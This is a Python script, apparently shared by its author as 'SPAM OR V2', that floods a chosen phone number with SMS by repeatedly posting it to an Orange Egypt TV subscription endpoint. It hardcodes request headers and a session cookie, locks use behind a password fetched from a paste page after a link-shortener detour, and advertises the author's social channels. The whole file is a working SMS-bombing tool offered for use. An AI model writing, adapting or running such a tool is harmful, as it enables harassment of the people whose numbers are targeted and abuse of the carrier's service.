import requests
from bs4 import BeautifulSoup as BS
import sys,time,pyfiglet 
from time import sleep 
print ('\033[1;92mclick on this link to get password👇')
#sleep (0.1)
print ()
link1="\033[1;93m https://miklpro.com/9aw3qf"
print (link1)
#sleep (1)
print ()
password=input ('\033[1;92m》Enter Password Script :  \033[1;96m')
sleep (1)

rrr=requests.get('https://pastelink.net/jr48awoi').text
soup=BS(rrr,'html.parser')
lxc=(soup.find('div',{'class':'body-display'})).text

if password in lxc : #=="Abdullah1115":
    print ()
    print ('\033[1;96m》True Password《')
    sleep (1)
else:
    print ()
    print ('\033[1;91mError Password')
    exit()
time.sleep (1)
poli=pyfiglet.figlet_format ('SPAM OR V2')
print (poli)
c=('\033[;092m×××××××××××××××××××××××××××××××××××××××')
for I in c+'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.040)
print ()
d =('\033[;092m##### Welcome To Abdullah Script #####')
for I in d +'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.10)
print ()
c='#### Script Spam Sms for Orange V2###'
for I in c+'\n':
    sys.stdout.write(I) 
    sys.stdout.flush ()
    time.sleep (00.10)
print ()
c='### Projected By Abdullah  Salah ###'
for I in c+'\n':
    sys.stdout.write(I) 
    sys.stdout.flush ()
    time.sleep (00.10)
print ()
i='''\033[;092m Telegram channel : 

  ◇ http://t.me/Techno0099
          
Youttube channel  : 

 ◇ https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg 

Facebook :

 ◇https://www.facebook.com/AbdullahSalah0099/
'''
for I in i +'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.030)
print ()



    
print ('\033[;092m')
num=input ('》Enter phone number  :  ')
print ()
number_of_messeges=(int(input ('Enter Number Of Messages  :  ')))

zcx=0
while zcx<number_of_messeges:
    
    url=('http://tvsub.orange.eg/VideoPortalLandingPage/SubInt')
    headers={
'Host': 'tvsub.orange.eg',

'Connection': 'keep-alive',

'Content-Length': '159',

'Cache-Control': 'max-age=0',
'Origin': 'http://tvsub.orange.eg',
'Upgrade-Insecure-Requests': '1',
'DNT': '1',

'Content-Type': 'application/x-www-form-urlencoded',
'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer': 'http://tvsub.orange.eg/VideoPortalLandingPage/getMobile',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'ar-EG,ar-AE;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
'Cookie':'JSESSIONID=7976C65AC1B6D01AC432A484DA6C9035; _ga=GA1.1.793566817.1646746310; _ga_MMZ8XRXXVN=GS1.1.1646746309.1.1.1646746322.0'}

    data={
'mobile':num,

'opId':'2',

'lang':'1',

'b':'https://tv.orange.eg/OrangeTVPortal/auth/processLogin/ZGV0YWlscy8xODE=',

'c':'2',

'alreadySub':'false',

'src':'null',

'os':'null'
}
    r=requests.post (url,headers=headers, data=data).text
    print ()
    zcx=zcx+1
    if 'سيصلك كود قصير على الموبايل الآن عن طريق ال SMS قم بإدخاله هنا'in r:
        time.sleep (1)
        print (f'\033[;096mDone Send {zcx} SMS')
        time.sleep (1)
    else:
        print ('\033[;091mSomthing Wrong Try Again')
